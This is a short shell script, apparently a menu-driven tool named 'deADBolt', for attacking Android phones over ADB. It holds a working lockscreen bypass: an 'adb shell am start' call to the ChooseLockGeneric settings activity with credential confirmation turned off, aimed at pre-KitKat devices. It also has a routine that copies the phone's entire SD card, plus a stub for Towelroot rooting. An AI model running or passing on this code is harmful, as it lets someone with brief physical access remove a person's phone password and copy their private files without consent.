#!/bin/sh


f_menu(){
	clear
	echo "deADBolt Menu"
	echo ""
	echo "[1] Acquire Root"
	echo "[2] Remove Password Protection"
	echo "[3] Pull All Data from SDcard"
	echo ""
	echo "[Q] Quit"
	echo ""
	read -p "Selection: " selection

	case $selection in
		1) f_towelroot; f_menu;;
		2) f_removelocks; f_menu;;
		3) f_pullallsd; f_menu;;
		q) clear; exit;;
		*) f_menu;;
	esac
	clear
}

###############
###Towelroot###
###############
f_towelroot(){
	read -p "Not Complete. Press [Enter] to continue."
}

################################
###Remove Password Protection###
################################
f_removelocks(){
	clear
	echo "This will remove the password protection on pre-KitKat ROMs."
	echo ""
	read -p "Press [Enter] to continue." null
	clear
	echo "To continue, plug in the device and ensure ADB is enabled."
	adb wait-for-device
	clear
	echo "Removing password protection..."
	adb shell am start -n com.android.settings/com.android.settings.ChooseLockGeneric --ez confirm_credentials false --ei lockscreen.password_type 0 --activity-clear-task
	clear
	echo "Removed password. If it was unsuccessful, your device is not supported."
	echo ""
	read -p "Press [Enter] to continue" null
	clear
}

##########################
###Pull All From SDcard###
##########################
f_pullallsd(){
	clear
	echo "To continue, plug in the device and ensure ADB is enabled"
	adb wait-for-device
	clear
	echo "Pulling data..."
	echo ""
	date=$(date +%m%d%Y-%H.%M.%S)
	adb pull /sdcard/ /sdcard/deADBolt/SDcard-$date
	clear
	echo "Pull complete. You can find the data in '/sdcard/deADBolt/SDcard-$date'."
	echo ""
	read -p "Press [Enter] to continue."
	clear
}








f_menu
